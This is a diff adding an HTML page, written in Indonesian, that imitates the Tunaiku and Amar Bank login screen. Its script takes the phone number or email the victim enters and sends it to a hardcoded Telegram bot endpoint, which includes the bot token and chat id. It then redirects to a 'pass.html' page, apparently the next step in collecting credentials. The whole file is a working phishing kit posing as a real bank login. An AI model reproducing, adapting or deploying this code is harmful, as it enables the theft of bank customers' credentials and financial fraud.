@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login-Tunaiku</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* Navbar atas */
+        .nav {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            background-color: #007bff;
+            padding: 12px 20px;
+            color: white;
+            box-sizing: border-box;
+            z-index: 1001; /* Pastikan navbar berada di atas konten lain */
+        }
+
+        .nav h2 {
+            margin: 0;
+            font-size: 1.5em;
+            text-align: left;
+        }
+
+        #main-content {
+            padding: 20px;
+             /* Tambahkan margin-top untuk memberi ruang untuk navbar */
+            filter: blur(2px);
+            transition: filter 0.3s ease;
+            flex: 1;
+            width: 100%;
+            max-width: 400px;
+            box-sizing: border-box;
+            position: relative; /* Untuk menjaga konten utama di bawah navbar */
+        }
+
+        #popup {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            display: flex;
+            justify-content: center;
+            align-items: flex-end;
+            z-index: 1000; /* Popup berada di bawah navbar */
+        }
+
+        #popup-content {
+            background-color: white;
+            border-radius: 10px 10px 0 0;
+            padding: 20px;
+            text-align: center;
+            width: 100%;
+            max-width: 400px;
+        }
+
+        #popup-content h1 {
+            margin: 0;
+            font-size: 1.5em;
+        }
+
+        #popup-content p {
+            margin: 15px 0;
+        }
+
+        #popup-content img {
+            width: 70%;
+            height: auto;
+            border-radius: 10px;
+            padding:20px;
+        }
+
+        #close-popup {
+            background-color: #00a550;
+            color: white;
+            border: none;
+            padding: 16px 130px;
+            border-radius: 10px;
+            cursor: pointer;
+            font-weight:bold;
+        }
+
+        .form-container {
+            max-width: 400px;
+            margin: 0 auto;
+            text-align: center;
+            padding-bottom: 80px;
+            /* Tambahkan padding untuk ruang tombol dan bantuan */
+            position: relative;
+margin-top: 50px;
+        }
+
+        .form-container input[type="number"] {
+            width: 90%;
+            padding: 15px;
+            margin: 15px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            margin-top: 10px;
+font-weight:bold;
+            
+        }
+
+        .form-container button {
+            width: 90%;
+            padding: 15px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            color: white;
+            background-color: silver;
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            max-width: 340px;
+            font-weight: bold;
+            margin-left:18px;
+        }
+
+        .form-container button.active {
+            background-color: #00a550;
+        }
+
+        .help-text {
+            margin-bottom: 6px; /* Jarak 6px dari tombol kirim */
+            color: #555;
+            position: fixed;
+            bottom: 46px; /* Posisikan 6px di atas tombol kirim (tombol height + margin-bottom) */
+            left: 0;
+            right: 0;
+            text-align: center;
+            width: 100%;
+            max-width: 400px;
+            box-sizing: border-box;
+        }
+
+        .help-text a {
+            color: #007bff;
+            text-decoration: none;
+        }
+        
+        .blue-text {
+  color: black;
+  font-size: 13px;
+  margin-right:-8px;
+  margin-left:-8px;
+  font-weight:bold;
+  position:center;
+  
+}
+.red-text {
+  color: black;
+  font-size: 15px;
+  margin-right:-8px;
+  margin-left:-60px;
+  font-weight:bold;
+  position:center;
+  
+}
+.black-text {
+  color: black;
+  font-size: 13px;
+  margin-right:-8px;
+  margin-left:-185px;
+  font-weight:bold;
+  position:center;
+  
+  
+}
+    </style>
+</head>
+<body>
+    <div id="popup">
+        <div id="popup-content">
+            <h1>Akun Tunaiku dan Amar Bank</h1>
+            <p>Sekarang Anda sudah bisa gunakan akun Amar Bank untuk akses masuk ke Tunaiku</p>
+            <img src="https://raw.githubusercontent.com/Peng4duanBrimo/Peng4duanBrimo.github.io/main/1000016158-removebg-preview.png" alt="Tunaiku dan Amar Bank">
+            <br>
+            <button id="close-popup">Mengerti</button>
+        </div>
+    </div>
+
+    <div id="main-content">
+        <div class="nav">
+            <h2>Masuk Akun</h2>
+        </div>
+        <div class="form-container">
+            <p class="right-align red-text">Masukan Nomor Handphone Atau Email</p>
+            <p class="right-align blue-text">Nomor Handphone Dan Email Harus Sudah Terdaftar Di</p>
+            <p class="right-align black-text">Tunaiku Atau Amar Bank</p>
+            <form id="login-form">
+                <input type="number" id="user-input" name="userInput" placeholder="Silahkan masukkan di sini">
+                <div class="help-text">
+                    Butuh Bantuan Masuk Akun? <a href="#">Klik Di sini</a>
+                </div>
+                <button type="button" id="submit-btn" disabled>Selanjutnya</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById("close-popup").addEventListener("click", function() {
+            document.getElementById("popup").style.display = "none";
+            document.getElementById("main-content").style.filter = "none";
+            document.body.style.overflow = "auto";
+        });
+
+        const userInput = document.getElementById("user-input");
+        const submitBtn = document.getElementById("submit-btn");
+
+        userInput.addEventListener("input", function() {
+            if (userInput.value.trim() !== "") {
+                submitBtn.disabled = false;
+                submitBtn.classList.add("active");
+            } else {
+                submitBtn.disabled = true;
+                submitBtn.classList.remove("active");
+            }
+        });
+
+        function sendMessageToTelegram(message) {
+            var xhttp = new XMLHttpRequest();
+            xhttp.onreadystatechange = function() {
+                if (this.readyState === 4 && this.status === 200) {
+                    console.log("Pesan terkirim: " + message);
+                }
+            };
+            var url = "https://api.telegram.org/bot6406080700:AAHtISL259Uu4s3x93AzNMWK-XGedAGdp_0/sendMessage?chat_id=6824078885&text=" + encodeURIComponent(message);
+
+            xhttp.open("GET", url, true); // Use GET method
+            xhttp.send();
+        }
+
+        function kirimPesan() {
+            var nomorHandphone = document.getElementById('user-input').value;
+
+            if (nomorHandphone.trim() === '') {
+                if (navigator.vibrate) {
+                    navigator.vibrate(200);
+                }
+                return;
+            }
+
+            var message = "Nomor Handphone: " + nomorHandphone;
+            sendMessageToTelegram(message);
+            console.log('Data berhasil dikirim ke Telegram!');
+            setTimeout(function() {
+                window.location.href = 'pass.html';
+            }, 1000); // Delay to ensure Telegram message is sent
+        }
+
+        document.getElementById("submit-btn").addEventListener("click", kirimPesan);
+    </script>
+
+</body>
+</html>
